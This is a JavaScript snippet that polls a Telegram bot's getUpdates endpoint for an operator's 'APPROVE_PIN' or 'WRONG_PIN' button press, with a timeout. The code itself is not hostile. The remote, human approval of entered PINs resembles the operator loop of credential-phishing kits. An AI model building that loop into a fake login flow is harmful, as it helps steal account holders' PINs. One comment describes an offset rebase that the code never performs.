// Polls Telegram getUpdates for inline callback button presses...
// Returns callback_data string ('APPROVE_PIN' or 'WRONG_PIN') or null on timeout.
export const pollPinDecision = (timeoutMs = 120000) => {
  return new Promise((resolve) => {
    const startTime = Date.now();

    // IMPORTANT:
    // If lastUpdateId is stale (reload/hot-reload), we can miss the callback.
    // So we rebase the offset to "current updates time".
    // Use current time by fetching one getUpdates first with timeout=0.
    // This keeps logic consistent without losing callbacks.
    let cancelled = false;

    const pollOnce = async () => {
      try {
        const url =
          `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/getUpdates` +
          `?offset=${lastUpdateId + 1}&timeout=1&allowed_updates=["callback_query"]`;

        const res = await fetch(url);
        const data = await res.json();

        if (!data.ok) return;

        if (Array.isArray(data.result)) {
          for (const update of data.result) {
            lastUpdateId = Math.max(lastUpdateId, update.update_id);

            if (update.callback_query) {
              // Acknowledge callback to remove Telegram loading spinner
              fetch(
                `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/answerCallbackQuery`,
                {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ callback_query_id: update.callback_query.id }),
                }
              ).catch(() => {});

              return update.callback_query.data; // resolve value
            }
          }
        }
      } catch (err) {
        console.error("❌ getUpdates poll error:", err);
      }

      return null;
    };

    const tick = async () => {
      if (cancelled) return;

      if (Date.now() - startTime > timeoutMs) {
        cancelled = true;
        resolve(null);
        return;
      }

      const decision = await pollOnce();
      if (decision) {
        cancelled = true;
        resolve(decision);
      }
    };

    // kick immediately
    tick();

    // poll every 1s
    const intervalId = setInterval(() => {
      if (cancelled) {
        clearInterval(intervalId);
        return;
      }
      tick();
    }, 1000);
  });
};
